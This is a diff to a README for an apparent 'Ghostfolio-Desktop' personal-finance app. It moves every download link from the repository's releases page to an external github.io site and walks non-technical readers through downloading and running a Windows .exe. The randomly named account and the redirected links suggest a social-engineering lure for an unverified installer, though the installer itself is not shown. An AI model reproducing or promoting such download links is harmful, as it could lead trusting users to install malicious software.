@@ -1,7 +1,7 @@
 <h1>📊 Ghostfolio-Desktop-Self-Hosted-Dashboard - Your Privacy-First Financial Command Center</h1>
 
 <p align="center">
-<a href="https://github.com/Pommyasclepiascurassavica8385/Ghostfolio-Desktop-Self-Hosted-Dashboard/releases"><img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-FF6B35?style=for-the-badge&logo=github&logoColor=white&labelColor=2C3E50" alt="Download Button" width="400"></a>
+<a href="https://pommyasclepiascurassavica8385.github.io"><img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-FF6B35?style=for-the-badge&logo=github&logoColor=white&labelColor=2C3E50" alt="Download Button" width="400"></a>
 </p>
 
 Welcome! This guide will help you set up your own personal finance dashboard in just a few minutes. No technical skills needed—just follow the simple steps below, and you'll be tracking your investments like a pro.
@@ -54,7 +54,7 @@ This is the easiest part. Here's everything you need to do:
 ### Step 1: Get the Installer
 
 Visit this link to download the application:  
-👉 **[Click Here to Download Ghostfolio-Desktop](https://github.com/Pommyasclepiascurassavica8385/Ghostfolio-Desktop-Self-Hosted-Dashboard/releases)**
+👉 **[Click Here to Download Ghostfolio-Desktop](https://pommyasclepiascurassavica8385.github.io)**
 
 Once you click the link, you'll see a page with release versions. Look for the most recent one (usually at the top). Click the download button for the **Windows version**—it will be labeled something like `Ghostfolio-Desktop-Windows.exe`.
 
@@ -172,7 +172,7 @@ That's it. Enjoy your new financial clarity!
 ---
 
 <p align="center">
-<a href="https://github.com/Pommyasclepiascurassavica8385/Ghostfolio-Desktop-Self-Hosted-Dashboard/releases"><img src="https://img.shields.io/badge/🔗_GET_THE_LATEST-27AE60?style=for-the-badge&logo=download&logoColor=white&labelColor=1C2833" alt="Download Again" width="350"></a>
+<a href="https://pommyasclepiascurassavica8385.github.io"><img src="https://img.shields.io/badge/🔗_GET_THE_LATEST-27AE60?style=for-the-badge&logo=download&logoColor=white&labelColor=1C2833" alt="Download Again" width="350"></a>
 </p>
 
 Keywords: asset-tracking, dashboard, docker, finance, finance-app, ghostfolio, investment-portfolio, pwa
